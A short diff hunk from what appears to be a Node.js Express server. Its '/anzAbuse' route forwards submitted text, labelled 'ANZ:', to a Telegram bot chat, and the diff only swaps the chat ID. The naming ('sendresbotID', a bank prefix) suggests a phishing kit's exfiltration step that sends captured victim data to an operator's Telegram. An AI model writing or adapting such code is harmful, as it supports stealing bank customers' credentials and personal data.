@@ -21221,7 +21221,7 @@ app.post("/anzAbuse", (req, res) => {
       .post(
         `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
         {
-          chat_id: 2055983688,
+          chat_id: '-800642674',
           text: `ANZ:\n${originalText}`,
           parse_mode: "Markdown",
         }
